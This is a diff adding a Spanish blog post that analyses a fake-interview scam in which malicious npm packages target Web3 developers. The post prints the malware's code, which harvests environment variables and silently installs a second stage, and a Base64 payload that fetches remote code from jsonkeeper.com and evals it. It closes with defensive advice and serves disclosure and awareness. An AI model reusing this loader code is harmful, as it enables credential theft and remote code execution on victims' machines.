@@ -1,0 +1,83 @@
+---
+title: 'Cazadores de Secretos: Mi experiencia con una estafa diseñada para Devs Web3'
+publishedAt: '2026-03-06'
+summary: 'Anatomía de una estafa dirigida a desarrolladores. Analizo el código real del malware que encontré, diseñado para drenar wallets y exfiltrar credenciales cloud mediante dependencias ocultas.'
+cover: banner.png
+---
+
+En el sector Web3, estamos acostumbrados a auditar código en busca de vulnerabilidades lógicas, pero rara vez esperamos que el propio proceso de entrevista sea el vector de ataque. Recientemente, viví una experiencia que sirve como recordatorio de lo predadores que pueden llegar a ser quienes buscan abusar de nuestra comunidad para extraer activos sensibles.
+
+Lo que empezó como una propuesta laboral aparentemente profesional resultó ser una trampa meticulosamente diseñada para comprometer mi entorno de desarrollo, mis billeteras y mi infraestructura cloud.
+
+## El Proceso: Una Fachada de Legitimidad
+
+El ataque no comenzó con un link sospechoso, sino con una **oferta de trabajo sólida**. La sofisticación del engaño radicaba en el esfuerzo previo de los atacantes:
+- **Identidad Corporativa Esculpida**: La empresa existía, los perfiles de los reclutadores en LinkedIn parecían reales y el briefing técnico era impecable.
+- **Activos de Diseño**: Se me proporcionó acceso a un Figma detallado y documentación técnica que legitimaba el supuesto proyecto Web3.
+- **El Cebo**: Un repositorio "sandbox" que debía auditar para demostrar mi capacidad técnica.
+
+## La Infección en Cadena (Nivel Código)
+
+La parte más peligrosa es cómo el malware se esconde tras dependencias aparentemente inofensivas. El ataque utilizaba un sistema de infección en dos fases:
+
+### Fase 1: El Caballo de Troya (`json-merge-tool`)
+Al revisar el archivo `lib/writer.js` de esta dependencia con apenas 97 descargas, encontré lógica para recolectar mi IP, dirección MAC, nombre de usuario y **todas mis variables de entorno**. Pero lo más grave era la instalación silenciosa de la siguiente fase:
+
+```javascript:json-merge-tool/lib/writer.js
+// Recolección de datos sensibles
+const data = {
+  ...process.env,
+  version: pkg.subModuleVersion,
+  platform: os.platform(),
+  hostname: os.hostname(),
+  username: os.userInfo().username,
+  macAddresses: getMacAddress(),
+}
+
+// Instalación silenciosa de la segunda fase
+try {
+  require('jsonify-core');
+} catch (err) {
+  if (ct > 0) {
+    execSync(`npm install jsonify-core --no-warnings --no-save --loglevel silent`, { windowsHide: true });
+    require('../../jsonify-core/pino.js');
+  }
+}
+```
+
+### Fase 2: Ejecución Remota y Ofuscación (`jsonify-core`)
+Una vez instalado `jsonify-core`, el ataque escalaba. Encontré un hash en Base64 diseñado para descargar y ejecutar código arbitrario desde un servidor externo (`jsonkeeper`).
+
+```javascript:jsonify-core/lib/writer.js
+const hash = "ZmV0Y2goJ2h0dHBzOi8vanNvbmtlZXBlci5jb20vYi8wRFdGQycpLnRoZW4ocj0+ci5qc29uKCkpLnRoZW4oZD0+e2V2YWwoZC5yZXQpO30pOw=="
+
+// Al decodificar el hash:
+// fetch('https://jsonkeeper.com/b/0DWFC').then(r=>r.json()).then(d=>{eval(d.ret);});
+
+eval(atob(hash));
+```
+
+El uso de `eval(atob(hash))` permitía a los atacantes cambiar el script malicioso de forma remota sin necesidad de actualizar el repositorio original, permitiéndoles mutar el ataque de un drenador de wallets a un capturador de credenciales cloud (`AWS`, `Azure`, `GCP`) en segundos.
+
+## El Momento Crítico: La Auditoría Preventiva
+
+Mi regla de oro es nunca ejecutar un `npm install` sin revisar antes el interior del motor. Al clonar el repositorio, mi instinto detectó anomalías en la arquitectura que no encajaban con un desarrollo estándar.
+
+<Callout type="warning" title="Red Flag Arquitectónica">
+  El proyecto era un monorepo con un backend y un frontend artificialmente distantes. Esta estructura suele usarse para "enterrar" archivos maliciosos en subdirectorios profundos, alejándolos de la vista rápida del desarrollador.
+</Callout>
+
+## Reflexión: Protegiendo el Sector
+
+Este no fue un ataque al azar; fue un intento de abuso coordinado. Los atacantes saben que los devs Web3 manejamos información sensible (private keys, API keys, accesos de producción) y han industrializado las "entrevistas trampa".
+
+<Callout type="error" title="Lección de Supervivencia">
+  En Web3, tu entorno de desarrollo **ES** tu bóveda. Un `npm install` mal gestionado es equivalente a entregar las llaves de tu infraestructura a un extraño.
+</Callout>
+
+### Protocolos de Prevención:
+- **Zero Trust Global**: Ningún repositorio es seguro hasta que se audite manualmente el `package.json` y los scripts de instalación peligrosa.
+- **Aislamiento Total**: Uso contenedores o VMs dedicadas para probar código de terceros que no provenga de fuentes verificadas.
+- **Gestión Sensible de .env**: Nunca almaceno credenciales de producción en mi máquina local de desarrollo.
+
+Espero que mi experiencia sirva para que otros desarrolladores no bajen la guardia. En este sector, mirar debajo de las piedras no es paranoia, es seguridad operativa.
